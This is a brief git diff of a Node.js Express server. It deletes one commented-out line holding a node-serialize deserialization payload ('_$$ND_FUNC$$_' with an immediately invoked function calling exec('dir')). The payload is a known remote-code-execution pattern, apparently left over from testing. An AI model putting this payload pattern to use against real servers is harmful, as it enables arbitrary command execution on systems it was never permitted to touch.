@@ -45,6 +45,4 @@ app.get("/", (req, res) => {
     }
 });
 
-//unserialize.unserialize({"rce":"_$$ND_FUNC$$_function(){\r\n        exec('dir', function(error, stdout, stderr) { console.log(stdout) });\r\n        }()"});
-
 app.listen(3000, () => console.log(`Server running on port 3000`));
